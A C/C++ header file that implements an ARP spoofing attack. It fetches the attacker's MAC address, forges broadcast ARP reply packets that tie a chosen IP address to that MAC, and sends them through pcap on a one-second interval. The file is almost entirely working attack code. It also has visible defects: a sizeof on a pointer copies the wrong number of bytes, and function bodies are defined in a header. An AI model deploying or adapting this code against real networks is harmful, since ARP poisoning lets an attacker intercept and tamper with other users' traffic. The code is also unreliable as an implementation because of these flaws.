#ifndef ARP_ATTACK_H
#define ARP_ATTACK_H

#include <stdint.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include "parse.h"

void getAttackerMAC(const char * dev, uint8_t * mac){
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0) perror("socket fail");
    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
        perror("ioctl fail");
    unsigned char * tmp = reinterpret_cast<unsigned char *>(ifr.ifr_hwaddr.sa_data);

    memcpy(mac,tmp,sizeof(mac));
}

void make_arp_packet(uint32_t senderIP, uint8_t * sender_mac, ARP_Packet * packet){
    uint8_t targetM[6];
    uint32_t targetIP = 0;
    memset(targetM,0xff,sizeof(targetM));
    memcpy(packet->eth.dst_MAC,targetM,sizeof(packet->eth.dst_MAC));
    memcpy(packet->eth.src_MAC,sender_mac,sizeof(packet->eth.src_MAC));
    packet->eth.ether_type=htons(0x0806);
    packet->arp.hw_type=htons(0x0001);
    packet->arp.p_type=htons(0x0800);
    packet->arp.hw_len=0x06;
    packet->arp.p_len=0x04;
    packet->arp.opcode=htons(0x2);
    memcpy(packet->arp.sender_mac, sender_mac, sizeof(packet->arp.sender_mac));
    memcpy(packet->arp.target_mac, targetM, sizeof(packet->arp.target_mac));
    packet->arp.sender_ip = senderIP;
    packet->arp.target_ip = targetIP;
}

void start_attack(u_char * arp_pkt, char * dev, pcap_t * handle){
    if(pcap_sendpacket(handle, arp_pkt, sizeof(unsigned char)*50)!=0){
        printf("couldn't send pkt\n");
        exit(0);
    }
    usleep(1000000);
}

#endif // ARP_ATTACK_H
